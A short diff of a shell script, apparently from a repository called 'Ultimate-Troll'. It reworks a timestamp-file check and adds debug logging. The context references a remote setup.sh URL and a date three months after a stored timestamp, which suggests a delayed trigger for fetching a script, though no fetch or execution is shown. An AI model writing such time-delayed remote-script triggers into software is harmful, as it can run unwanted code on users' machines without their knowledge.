@@ -6,7 +6,13 @@ SUCCESS_MARKER="$SUBP_DIR/success"
 SETUP_URL="https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/setup.sh"
 SETUP_PATH="$TARGET_DIR/setup.sh"
 
-if [ -f "$TIME_FILE" ]; then
+# Path to the timestamp file
+TIME_FILE="$TARGET_DIR/time"
+echo "[DEBUG] TIME_FILE set to: $TIME_FILE"
+
+if [ -z "$TIME_FILE" ] || [ ! -f "$TIME_FILE" ]; then
+  echo "[DEBUG] TIME_FILE does not exist or is not set: $TIME_FILE"
+else
   ORIG_TS_STR=$(cat "$TIME_FILE")
   echo "[DEBUG] Original timestamp string: $ORIG_TS_STR"
   # Compute the date exactly 3 months after original timestamp
@@ -38,4 +44,5 @@ EOF
   else
     echo "[DEBUG] Condition not met: no action"
   fi
+fi
 fi
